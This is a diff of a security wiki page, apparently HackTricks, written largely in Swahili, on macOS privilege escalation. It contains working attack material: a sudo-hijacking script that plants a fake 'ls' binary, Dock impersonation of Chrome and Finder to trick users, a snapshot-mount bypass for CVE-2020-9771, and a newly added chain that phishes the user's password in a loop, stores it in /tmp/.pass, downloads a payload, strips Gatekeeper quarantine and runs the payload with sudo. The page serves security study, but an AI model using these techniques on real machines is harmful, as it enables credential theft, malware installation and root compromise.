@@ -4,7 +4,8 @@
 
 ## TCC Privilege Escalation
 
-Ikiwa umekuja hapa kutafuta TCC privilege escalation nenda kwa:
+If you came here looking for TCC privilege escalation go to:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,19 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Tafadhali kumbuka kwamba **mbinu nyingi za privilege escalation zinazohusiana na Linux/Unix pia zitaathiri mashine za MacOS**. Hivyo angalia:
+Tafadhali kumbuka kwamba **mikakati mingi kuhusu privilege escalation zinazowagusa Linux/Unix pia zitaathiri mashine za MacOS**. Kwa hivyo angalia:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## User Interaction
+## Mwingiliano wa Mtumiaji
 
 ### Sudo Hijacking
 
-Unaweza kupata mbinu ya asili ya [Sudo Hijacking ndani ya chapisho la Linux Privilege Escalation](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Hata hivyo, macOS **inaendelea** na **`PATH`** ya mtumiaji anapotekeleza **`sudo`**. Ambayo inamaanisha kwamba njia nyingine ya kufanikisha shambulio hili ingekuwa **kudukua binaries nyingine** ambazo mwathirika bado atatekeleza anapokuwa **akifanya sudo:**
+Hata hivyo, macOS **inahifadhi** **`PATH`** ya mtumiaji anapotekeleza **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kufanikisha shambulio hili ni **kuchukua udhibiti wa binaries nyingine** ambazo mwathiriwa bado atazitumia anapotekeleza **`sudo`**:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Kumbuka kwamba mtumiaji anayetumia terminal kwa uwezekano mkubwa atakuwa na **Homebrew installed**. Hivyo inawezekana kuiba binaries katika **`/opt/homebrew/bin`**.
+Kumbuka kwamba mtumiaji anayeitumia terminali ana uwezekano mkubwa kuwa na **Homebrew installed**. Kwa hivyo inawezekana kuiba binaries katika **`/opt/homebrew/bin`**.
 
 ### Dock Impersonation
 
-Kwa kutumia **social engineering** unaweza **kujifanya mfano Google Chrome** ndani ya dock na kwa kweli kutekeleza script yako mwenyewe:
+Kwa kutumia **social engineering** unaweza **kuigiza, kwa mfano, Google Chrome** ndani ya dock na kwa kweli utekeleze script yako mwenyewe:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Mapendekezo kadhaa:
 
-- Angalia katika Dock kama kuna Chrome, na katika hali hiyo **ondoa** ile entry na **ongeza** ile **fake** **Chrome entry katika nafasi ile ile** katika Dock array.
+- Angalia katika Dock kama kuna Chrome, na katika kesi hiyo **ondoa** ile entry na **ongeza** **entry bandia ya Chrome katika nafasi ile ile** katika Dock array.
 ```bash
 #!/bin/sh
 
@@ -122,13 +124,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Baadhi ya mapendekezo:
+Mapendekezo kadhaa:
 
-- Huwezi kuondoa Finder kutoka kwenye Dock, hivyo ikiwa unataka kuiongeza kwenye Dock, unaweza kuweka Finder bandia karibu na ile halisi. Kwa hili unahitaji **kuongeza kipengee cha Finder bandia mwanzoni mwa orodha ya Dock**.
-- Chaguo lingine ni kutokuweka kwenye Dock na kuifungua tu, "Finder inahitaji kudhibiti Finder" si ajabu sana.
-- Chaguo lingine ili **kuinua hadhi hadi root bila kuomba** nenosiri kwa sanduku mbaya, ni kufanya Finder kweli kuomba nenosiri ili kutekeleza kitendo cha kibali:
-- Omba Finder nakala kwenda **`/etc/pam.d`** faili mpya ya **`sudo`** (Kichocheo kinachoomba nenosiri kitaonyesha kwamba "Finder inataka kunakili sudo")
-- Omba Finder nakala faili mpya ya **Authorization Plugin** (Unaweza kudhibiti jina la faili ili kichocheo kinachoomba nenosiri kitaonyesha kwamba "Finder inataka kunakili Finder.bundle")
+- Huwezi **kuondoa Finder kutoka kwenye Dock**, kwa hivyo ikiwa utaleta kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengee cha Finder bandia mwanzoni mwa Dock array**.
+- Chaguo jingine ni kutoiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la kushangaza sana.
+- Chaguo jingine kwa ajili ya **kupandisha hadi root bila kuuliza** nywila kwa kisanduku kibaya, ni kumfanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
+- Muombe Finder nakili kwenye **`/etc/pam.d`** faili mpya ya **`sudo`** (Ujumbe unaouliza nywila utaonyesha kwamba "Finder wants to copy sudo")
+- Muombe Finder nakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili ujumbe unaouliza nywila uonyeshe kwamba "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Kuinua Privilege ya Root
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - mount_apfs TCC bypass na kuinua privilege
+Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **capture a sudo-capable password** na kuitumia tena kwa programu. Mtiririko wa kawaida:
 
-**Mtumiaji yeyote** (hata wasio na mamlaka) anaweza kuunda na kuunganisha picha ya mashine ya wakati na **kufikia FAILI ZOTE** za picha hiyo.\
-**Mamlaka pekee** inayohitajika ni kwa programu inayotumika (kama `Terminal`) kuwa na **Upatikanaji wa Diski Kamili** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inahitaji kupewa na admin.
+1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
+2. **Loop password prompts** mpaka `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
+3. Hifadhi kredenshali (mfano, `/tmp/.pass`) na fanya vitendo vyenye mamlaka kwa kutumia `sudo -S` (password over stdin).
+
+Mfano wa mnyororo mdogo:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Neno la siri lililodukuliwa linaweza kisha kutumika tena ku**ondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye vigezo vya juu, na kuendesha hatua zinazofuata bila mwingiliano.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Mtumiaji yeyote** (hata wale wasio na vibali) anaweza kuunda na mount Time Machine snapshot na **kupata FAILI ZOTE** za snapshot hiyo.\
+**Vibali pekee** vinavyohitajika ni kwa programu inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambavyo vinapaswa kupewa na admin.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Maelezo ya kina zaidi yanaweza kupatikana [**katika ripoti ya asili**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Maelezo ya kina yanaweza kupatikana [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Taarifa Nyeti
 
-Hii inaweza kuwa na manufaa kuongeza mamlaka:
+Hii inaweza kusaidia kupandisha ruhusa:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Marejeo
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
